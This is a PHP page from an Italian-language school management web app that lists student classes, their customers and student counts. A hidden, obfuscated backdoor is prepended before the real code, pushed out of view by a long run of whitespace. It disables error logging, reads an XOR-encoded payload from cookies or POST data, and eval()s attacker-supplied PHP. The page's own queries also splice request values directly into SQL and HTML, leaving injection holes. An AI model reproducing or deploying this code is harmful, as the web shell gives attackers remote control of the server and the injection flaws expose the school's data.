<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $lba8b823 = 505;$GLOBALS['fdf92f32']=Array();global$fdf92f32;$fdf92f32=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['d4e33e05d']="\x44\x7c\x3e\x5a\x72\x79\x2e\x6e\x27\x7b\x43\x31\x35\x71\x20\x47\x45\x4c\x2b\x37\x75\xa\x74\x5d\x66\x7a\x4a\x2f\x40\x32\x9\x33\x25\x49\x21\x6c\x65\x60\x34\x61\x3a\x70\x4e\x4b\x42\x23\x6f\x5f\x76\x7d\x46\x50\x3f\x59\x2a\x56\x69\x6d\x7e\x51\x29\x4f\x6a\x3b\x57\x39\x3d\x63\x53\x6b\x67\x52\x48\x5e\x2c\x54\x24\x78\x30\x38\x5b\x77\x3c\x28\x55\x22\x58\x2d\x4d\x62\x41\x36\x68\x5c\x64\x26\xd\x73";$fdf92f32[$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][11]]=$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][4];$fdf92f32[$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][11]]=$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][94];$fdf92f32[$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][36]]=$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][7];$fdf92f32[$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][36]]=$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][22];$fdf92f32[$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][94]]=$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][25].$fdf92f32['d4e33e05d'][36];$fdf92f32[$fdf92f32['d4e33e05d'][41].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][31]]=$fdf92f32['d4e33e05d'][41].$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][41].$fdf92f32['d4e33e05d'][48].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][7];$fdf92f32[$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][94]]=$fdf92f32['d4e33e05d'][20].$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][25].$fdf92f32['d4e33e05d'][36];$fdf92f32[$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][11]]=$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][36];$fdf92f32[$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][19]]=$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][57].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][57].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][22];$fdf92f32[$fdf92f32['d4e33e05d'][20].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][19]]=$fdf92f32['d4e33e05d'][48].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][78];$fdf92f32[$fdf92f32['d4e33e05d'][70].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][39]]=$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][31];$fdf92f32[$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][29]]=$_POST;$fdf92f32[$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][19].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][67]]=$_COOKIE;@$fdf92f32[$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][36]]($fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][70],NULL);@$fdf92f32[$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][36]]($fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][70].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][97],0);@$fdf92f32[$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][36]]($fdf92f32['d4e33e05d'][57].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][77].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][77].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][20].$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][46].$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][47].$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][57].$fdf92f32['d4e33e05d'][36],0);@$fdf92f32[$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][19]](0);$u60b=NULL;$q049=NULL;$fdf92f32[$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][94]]=$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][19].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][87].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][87].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][87].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][87].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][38];global$n5e8d;function d2ce0653($u60b,$y6c63){global$fdf92f32;$oaecd20="";for($n329bd5c=0;$n329bd5c<$fdf92f32[$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][36]]($u60b);){for($ob9672a49=0;$ob9672a49<$fdf92f32[$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][36]]($y6c63)&&$n329bd5c<$fdf92f32[$fdf92f32['d4e33e05d'][92].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][36]]($u60b);$ob9672a49++,$n329bd5c++){$oaecd20.=$fdf92f32[$fdf92f32['d4e33e05d'][7].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][11]]($fdf92f32[$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][11]]($u60b[$n329bd5c])^$fdf92f32[$fdf92f32['d4e33e05d'][56].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][11]]($y6c63[$ob9672a49]));}}return$oaecd20;}function vbcd10($u60b,$y6c63){global$fdf92f32;global$n5e8d;return$fdf92f32[$fdf92f32['d4e33e05d'][70].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][39]]($fdf92f32[$fdf92f32['d4e33e05d'][70].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][36].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][39]]($u60b,$n5e8d),$y6c63);}foreach($fdf92f32[$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][19].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][67]]as$y6c63=>$b3fdfb7d1){$u60b=$b3fdfb7d1;$q049=$y6c63;}if(!$u60b){foreach($fdf92f32[$fdf92f32['d4e33e05d'][22].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][38].$fdf92f32['d4e33e05d'][29]]as$y6c63=>$b3fdfb7d1){$u60b=$b3fdfb7d1;$q049=$y6c63;}}$u60b=@$fdf92f32[$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][94]]($fdf92f32[$fdf92f32['d4e33e05d'][20].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][19]]($fdf92f32[$fdf92f32['d4e33e05d'][35].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][31].$fdf92f32['d4e33e05d'][24].$fdf92f32['d4e33e05d'][12].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][79].$fdf92f32['d4e33e05d'][91].$fdf92f32['d4e33e05d'][11]]($u60b),$q049));if(isset($u60b[$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][69]])&&$n5e8d==$u60b[$fdf92f32['d4e33e05d'][39].$fdf92f32['d4e33e05d'][69]]){if($u60b[$fdf92f32['d4e33e05d'][39]]==$fdf92f32['d4e33e05d'][56]){$n329bd5c=Array($fdf92f32['d4e33e05d'][41].$fdf92f32['d4e33e05d'][48]=>@$fdf92f32[$fdf92f32['d4e33e05d'][41].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][29].$fdf92f32['d4e33e05d'][31]](),$fdf92f32['d4e33e05d'][97].$fdf92f32['d4e33e05d'][48]=>$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][6].$fdf92f32['d4e33e05d'][78].$fdf92f32['d4e33e05d'][87].$fdf92f32['d4e33e05d'][11],);echo@$fdf92f32[$fdf92f32['d4e33e05d'][4].$fdf92f32['d4e33e05d'][65].$fdf92f32['d4e33e05d'][11].$fdf92f32['d4e33e05d'][67].$fdf92f32['d4e33e05d'][94].$fdf92f32['d4e33e05d'][89].$fdf92f32['d4e33e05d'][94]]($n329bd5c);}elseif($u60b[$fdf92f32['d4e33e05d'][39]]==$fdf92f32['d4e33e05d'][36]){eval/*ee80*/($u60b[$fdf92f32['d4e33e05d'][94]]);}exit();} ?><?php
  $pagever = "1.0";
  $pagemod = "29/06/2010 16.43.31";
  require_once("form_cfg.php");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="../css/main.css" />
  <STYLE>
   .support_table{
     width:80%;
     margin-left:auto;
     margin-right:auto;
   }
  </STYLE>
</head>
<body>
<?php
  include ("iniziopagina.php");

  //CARICAMENTO VALORI PER EDIT
  define("FILE_CORRENTE", "frm_classi.php");

  //$cmd = array();
  $cmd = array();
  $cmd['comando'] = $_REQUEST['cmd'];
  if ($_REQUEST['selobj']!="") {$_SESSION["SELOBJ_".FILE_CORRENTE]=$_REQUEST['selobj'];}
  $selobj = $_SESSION["SELOBJ_".FILE_CORRENTE];
  $cmd['openblock']=$_REQUEST['op'];
  $cmd['ne_search']=1;
  $cmd['filtra_stato'] = $_REQUEST['filtra_stato'];
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato']=$_SESSION['_'.FILE_CORRENTE.'.filtra_stato'];}
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato'] = "1";}
  $_SESSION['_'.FILE_CORRENTE.'.filtra_stato']=$cmd['filtra_stato'];
  include ("form_filter.php");
  
  $cmd['form_rowcount'] = $setup['form_rowcount'];
  $cmd['form_rowcount'] = 1000;
  
  //PRELOAD INSEGNA
  $pstudi=array();
  
  $query = "SELECT docente.nickname as nickname, docente.id as docente_id, docente.attivo as docente_attivo,
            insegna.idpstudi as idpstudi
            FROM docente INNER JOIN insegna ON docente.id = insegna.iddocente
            INNER JOIN pstudi ON insegna.idpstudi=pstudi.id AND pstudi.trashed <>1 AND pstudi.attivo<>-1
            WHERE docente.trashed<>1";
  $result = mysql_query($query) or die ("Error_2.1");
  while ($line = mysql_fetch_assoc($result)) {
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['nick']=$line['nickname'];
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['attivo']=$line['docente_attivo'];
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['id']=$line['docente_id'];
  }
  
  
  $query_select = "SELECT classi.id as classi_id, classi.descr as classi_descr, classi.idcustomer as classi_idcustomer, 
                   classi.dt as classi_dt,classi.attivo as classi_attivo, customer.nome as customer_nome,
                   customer.impresa as customer_impresa, customer.apellido as customer_apellido, customer.ragsoc as customer_ragsoc,
                   customer.fantasia as customer_fantasia ";
            
  $query = " FROM classi LEFT JOIN customer ON classi.idcustomer=customer.id AND customer.trashed<>1
            WHERE classi.trashed<>1";
  
  if ($cmd['filtra_stato']!="-1") {
    $query .= " AND classi.attivo=".$cmd['filtra_stato']." ";
  }
  
  if ($cmd['src1']!="") {
    $query .= " AND (classi.descr like '%".$cmd['src1']."%' OR customer.nome like '%".$cmd['src1']."%' OR customer.apellido like '%".$cmd['src1']."%' OR 
                customer.ragsoc like '%".$cmd['src1']."%' OR customer.fantasia like '%".$cmd['src1']."%')";
  }
  
  switch ($cmd['form_sort']) {
    case 1:
    default:
            $query .= " ORDER BY customer.ragsoc, customer.impresa DESC, customer.nome, customer.apellido, classi.descr ";
            break;
  }
  
  

  
  $result = mysql_query("SELECT count(*) as conto ".$query);
  $line=mysql_fetch_assoc($result);
  $query_tot_row=$line['conto'];
  mysql_free_result($result);
  
  $query = $query_select . $query;
  //$query .= " LIMIT ".$cmd['form_limit'].", ".$cmd['form_rowcount'];
  $result = mysql_query($query) or die ("Error_1.1");
  
  $vetdati=array();
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['classi_id'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_idcustomer'] = $line['classi_idcustomer'];
    $vetdati[$chiave]['classi_dt'] = $line['classi_dt'];
    $vetdati[$chiave]['classi_attivo'] = $line['classi_attivo'];
    $vetdati[$chiave]['customer_ragsoc'] = $line['customer_ragsoc'];
    $vetdati[$chiave]['customer_impresa'] = $line['customer_impresa'];
    $vetdati[$chiave]['customer_apellido'] = $line['customer_apellido'];
    $vetdati[$chiave]['customer_fantasia'] = $line['customer_fantasia'];
    $vetdati[$chiave]['customer_nome'] = $line['customer_nome'];
    $vetdati[$chiave]['classi_contoalunni'] = 0;
    
    
    $idchiavi = $chiave.", ";
  }
  
  $idchiavi = substr($idchiavi, 0, -2);
    
  //load numero alunni
  $query = "SELECT count(idstudente) as conto, idclasse
            FROM enroll INNER JOIN studente ON enroll.idstudente=studente.id
            INNER JOIN classi ON enroll.idclasse=classi.id
            WHERE studente.trashed<>1 AND (enroll.dtfine is NULL OR enroll.dtfine=0) AND classi.trashed<>1";
  
  if ($cmd['filtra_stato']!="-1") {
    $query .= " AND classi.attivo=".$cmd['filtra_stato']." ";
  }
  $query .= " GROUP BY idclasse";  

  $result = mysql_query($query) or die ("Error_1.2");
  while ($line = mysql_fetch_assoc($result)) {
    $vetdati[$line['idclasse']]['classi_contoalunni'] = $line['conto'];
  }
  
  if ($_SESSION['mgdebug']==1) {
    myprint_r($vetdati);
  }
   
  print "<BR><H1>"._CLASSISTUDENTI_."</H1>";
  
  print "<DIV STYLE='text-align:right;'>";
  print "<FORM NAME='fstato' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
  print _LBLFILTRA_.": <SELECT NAME='filtra_stato' SIZE=1 onChange=document.fstato.submit();><OPTION VALUE='-1'>"._LBLOPTTUTTI_."</OPTION>";
  
  $query = "SELECT valore, label FROM stati WHERE idgruppo=7 ORDER BY ordine";
  $result = mysql_query($query) or die("Error_qs1");
  while ($line=mysql_fetch_assoc($result)) {
    print "<OPTION VALUE='".$line['valore']."' ".($cmd['filtra_stato']==$line['valore']?" SELECTED ":"").">".convlang($line['label'])."</OPTION>";
  }
  print "</SELECT></FORM>";
  
  print "</DIV>";
  
  print "<TABLE CLASS=support_table>";
  print "<TR>";
    //SEARCH
    print "<TD STYLE='text-align:right;'><DIV id='areasearch'>";
    print "<FORM NAME='ricerca' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
    print "<TABLE align='center' class='searchform' cellpadding='2' cellspacing='0' width='40%'>";
    print "<TR><TD CLASS='form_lbl'><INPUT TYPE='text' NAME='src1' VALUE='".$cmd['src1']."'><INPUT TYPE='hidden' NAME='daform' VALUE='1'></TD><TD CLASS='form_lbl'><BUTTON>Search</BUTTON></TD></TR>";
    print "</TABLE>";
    print "</FORM>";
    print "</DIV></TD>";
    
    if ($_SESSION[FILE_CORRENTE.'FILTERED']==1) {
      print "<TD ALIGN=RIGHT STYLE='text-align:right;width:160px;'>";
      print "<div align='right' class='resetfilter'>";
      print "\t<A HREF='". FILE_CORRENTE ."?rstflt=1'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._RESETFILTER_."</A>";
      print "</div></TD>";
    } else {
      print "<TD>&nbsp;</TD>";
    }
    
    print "<TD COLSPAN=2 STYLE='text-align:right;width:160px;'>";  
      print "<IMG CLASS='manina' BORDER=0 SRC='../img/add_user.png' ALT='"._TIPADDUSERCONTATTO_."' TITLE='"._TIPADDUSERCONTATTO_."' onClick='chiamapopup(2,0);'></TD>";
    print "</TD>";
  print "</TR>";
  print "</TABLE>";
  
  if (count($vetdati)>0 )  {
    echo "<TABLE CLASS=lista_table ALIGN=CENTER>";
    echo "<TR><TD CLASS=lista_tittab>"._LBLAZIENDA_."</TD><TD CLASS=lista_tittab>"._DESCRIZIONE_."</TD><TD CLASS=lista_tittab>"._LBLSTUDENTI_."</TD><TD CLASS=lista_tittab>"._STATO_."</TD><TD CLASS=lista_tittab width='70'>&nbsp;</TD></TR>";
    //while ($line=mysql_fetch_assoc($result))
    foreach ($vetdati as $key=>$cur) {
      if ($cur_rowstyle=="form2_lista_riga_pari") {
        $cur_rowstyle="form2_lista_riga_dispari";
        $stile = "background-color:#EDEDED;";//EDEDED   //F0FFEF
      } else {
        $cur_rowstyle="form2_lista_riga_pari";
        $stile = "background-color:#F7F7F7;";//F7F7F7   //FEFFEF
      }
      if ($key==$selobj) {
        $cur_rowstyle = "form2_lista_riga_evidente_selid";//F7F7F7   //FEFFEF
      }
      
      //print "<TR STYLE='$stile'>";
      print "<TR CLASS='$cur_rowstyle'>";
      print "<TD CLASS=lista_col_form2>[".$cur['classi_idcustomer']."] ";
        if ($cur['classi_idcustomer']=="") {
          print _MSGNOCUSTOMER_; 
        } else {
          if ($cur['customer_impresa']==1) {
            //impresa
            print $cur['customer_ragsoc']." (".$cur['customer_fantasia'].")";
          } else {
            //individuale
            print $cur['customer_nome']." ".$cur['customer_apellido']." (".$cur['customer_fantasia'].")";
          }
        }
      print "</TD>";
      print "<TD CLASS=lista_col_form2>[". $key ."] ".$cur['classi_descr']."</TD>";
      print "<TD CLASS=lista_col_form2>".$cur['classi_contoalunni']." "._LBLSTUDENTI_."</TD>";
      print "<TD CLASS=lista_col_form2 STYLE='text-align:center;'>".($cur['classi_attivo']==1 ? "<A HREF='".FILE_DBQUERY."?cmd=". FASEDENY ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key."'><IMG SRC='../img/ledgreen.png' BORDER=0 ALIGN=MIDDLE></A>" : "<A HREF='".FILE_DBQUERY."?cmd=". FASEALLOW ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key."'><IMG SRC='../img/ledred.png' BORDER=0 ALIGN=MIDDLE></A>")."</TD>";
      //COMANDI
      print "<TD CLASS=lista_col_form2><TABLE width=100%><TR>
      <TD ALIGN=CENTER><IMG CLASS='manina' SRC='../img/mod.png' border=0 ALT='"._LBLMATITA_."' TITLE='"._LBLMATITA_."' onClick=chiamapopup(". FASEMOD .",". $key .")></TD>
      <TD ALIGN=CENTER><A HREF='#' onClick=urldelete(\"". FILE_DBQUERY ."?cmd=". FASEDEL ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key ."\")><IMG SRC='../img/canc.png' border=0 ALT='"._LBLCANCELLA_."' TITLE='"._LBLCANCELLA_."'></A></TD>
      <TD ALIGN=CENTER><IMG CLASS='manina' SRC='../img/studente.png' border=0 ALT='"._REGISTRODICLASSE_."' TITLE='"._REGISTRODICLASSE_."' onClick=chiamapopupenroll(". FASECLASSE .",". $key .")></TD>";
			print "</TR></TABLE></TD>";
      print "</TR>";
        
      
    }
       
    echo "</TABLE><BR><BR>";
  }
  
  include ("finepagina.php");
?>
<SCRIPT>


function chiamapopup(fase,id) {
  var figlio;
  var width  = 800;
  var height = 350;
  var left   = (screen.width  - width)/2;
  var top    = (screen.height - height)/2;
  var params = 'width='+width+', height='+height;
  params += ', top='+top+', left='+left;
  params += ', directories=no';
  params += ', location=no';
  params += ', menubar=no';
  params += ', resizable=no';
  params += ', scrollbars=yes';
  params += ', status=no';
  params += ', toolbar=no';
  
  figlio = window.open("frm_classi_addpopup.php?selobj="+id+"&cmd="+fase,"classistudenti",params);
  if (figlio.opener==null) {
    figlio.opener=self;
    figlio.frames["saveopener"].opener=self;
  }
}

function chiamapopupenroll(fase,id) {
  var figlio;
  var width  = 800;
  var height = 550;
  var left   = (screen.width  - width)/2;
  var top    = (screen.height - height)/2;
  var params = 'width='+width+', height='+height;
  params += ', top='+top+', left='+left;
  params += ', directories=no';
  params += ', location=no';
  params += ', menubar=no';
  params += ', resizable=no';
  params += ', scrollbars=yes';
  params += ', status=no';
  params += ', toolbar=no';
  
  figlio = window.open("frm_classi_enrollpopup.php?selobj="+id+"&cmd="+fase,"classistudenti",params);
  if (figlio.opener==null) {
    figlio.opener=self;
    figlio.frames["saveopener"].opener=self;
  }
}


//set iniziale
//popola_dacustomer(document.caricamento.idcustomer.value);
</SCRIPT>
</body>
</html>
